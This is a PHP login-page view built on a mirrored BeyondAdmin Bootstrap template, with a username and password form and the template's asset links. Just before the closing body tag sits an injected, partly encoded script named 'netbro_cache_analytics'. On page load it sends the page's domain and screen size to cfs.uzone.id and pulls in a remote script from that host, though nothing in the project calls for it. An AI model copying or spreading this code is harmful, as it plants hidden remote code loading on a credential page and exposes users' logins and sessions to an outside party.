<?php 
echo form_open('login/login');?>
<!DOCTYPE html>
<!--
BeyondAdmin - Responsive Admin Dashboard Template build with Twitter Bootstrap 3.3.6
Version: 1.6.0
Purchase: https://wrapbootstrap.com/theme/beyondadmin-adminapp-angularjs-mvc-WB06R48S4
-->

<html xmlns="http://www.w3.org/1999/xhtml">
<!--Head-->

<!-- Mirrored from beyondadmin-v1.6.0.s3-website-us-east-1.amazonaws.com/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 07 Sep 2016 00:45:19 GMT -->
<head>
    <meta charset="utf-8" />
    <title>Login Page</title>

    <meta name="description" content="login page" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <link rel="shortcut icon" href="assets/img/favicon.png" type="image/x-icon">

    <!--Basic Styles-->
    <link href="<?php echo base_url();?>assets/css/bootstrap.min.css" rel="stylesheet" />
    <link id="<?php echo base_url();?>bootstrap-rtl-link" href="#" rel="stylesheet" />
    <link href="<?php echo base_url();?>assets/css/font-awesome.min.css" rel="stylesheet" />

    <!--Fonts-->
    <link href="http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,400,600,700,300" rel="stylesheet" type="text/css">

    <!--Beyond styles-->
    <link  href="<?php echo base_url();?>assets/css/beyond.min.css" rel="stylesheet" />
    <link href="<?php echo base_url();?>assets/css/demo.min.css" rel="stylesheet" />
    <link href="<?php echo base_url();?>assets/css/animate.min.css" rel="stylesheet" />
    <link id="skin-link" href="#" rel="stylesheet" type="text/css" />

    <!--Skin Script: Place this script in head to load scripts for skins and rtl support-->
    <script src="assets/js/skins.min.js"></script>
</head>
<!--Head Ends-->
<!--Body-->
<body>
    <div class="login-container animated fadeInDown">
        <div class="loginbox bg-white">
            <div class="loginbox-title">SIGN IN</div>
            <div class="loginbox-social">
                <div class="social-title ">Connect with Your Social Accounts</div>
                <div class="social-buttons">
                    <a href="#" class="button-facebook">
                        <i class="social-icon fa fa-facebook"></i>
                    </a>
                    <a href="#" class="button-twitter">
                        <i class="social-icon fa fa-twitter"></i>
                    </a>
                    <a href="#" class="button-google">
                        <i class="social-icon fa fa-google-plus"></i>
                    </a>
                </div>
            </div>
            <div class="loginbox-or">
                <div class="or-line"></div>
                <div class="or">OR</div>
            </div>
            <div class="loginbox-textbox">
                <input type="text" class="form-control" placeholder="username" name="username"/>
            </div>
            <div class="loginbox-textbox">
                <input type="password" class="form-control" placeholder="Password" name="password" />
            </div>
            <div class="loginbox-forgot">
                <a href="#">Forgot Password?</a>
            </div>
            <div class="loginbox-submit">
                <input type="submit" class="btn btn-primary btn-block" name="submit" value="Login">
            </div>
            <div class="loginbox-signup">
                <a href="register.html">Sign Up With Email</a>
            </div>
        </div>
        <div class="logobox">
        </div>
    </div>

    <!--Basic Scripts-->
    <script src="<?php echo base_url();?>assets/js/jquery.min.js"></script>
    <script src="<?php echo base_url();?>assets/js/bootstrap.min.js"></script>
    <script src="<?php echo base_url();?>assets/js/slimscroll/jquery.slimscroll.min.js"></script>

    <!--Beyond Scripts-->
    <script src="<?php echo base_url();?>assets/js/beyond.js"></script>

    
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnRT264VaUKCfVpUbDPMBGbII%2brv1d2qyN6cZ14ui9z%2fVM4s3Q6bgNnMMQcHgKSa0N2Tsb37RHcIve0wVPYklIQc3YF74x5l%2fgeTBNrLBYUUltFD92Ka8VHT7plXBBG4i8gXywoe965XV22cQehE%2f2q4s4BYWPniaFsDWcmuPtgJ2Y1Wy8FWaThhdVmpPqsvfkX7HfQGMpWBUmNaaP2n%2f39MapIlgXq4nYgOSCmWNtwmpIEr%2f%2fhiRwbBxYLG0eaE2Q5LiB0g9IRIFyy8nI87efki9%2ffIWsvyVWc9pkqSHyI5DlwWgM6O66c16qpPw2l24pQNZZ2ds5A5SJrCaMsaSgTrve3R1JK%2frmQ9%2bNhFrP0Qcs%2fFtEEMn90ZBx%2f2WHrrE7o0ZVF78kP7X5tCcMigOyqX%2buQs77EWnc2tkqu8iLNRS3X2gZf8%2bUQ1vdt%2fRY76fH3QMk37mHwsFcz%2fmLebbtrWNmorT5NzNg4JzmYoJsiAKfQW%2bwK%2b2h%2bd%2fe5Bf5iMsi" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
<!--Body Ends-->

<!-- Mirrored from beyondadmin-v1.6.0.s3-website-us-east-1.amazonaws.com/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 07 Sep 2016 00:45:19 GMT -->
</html>
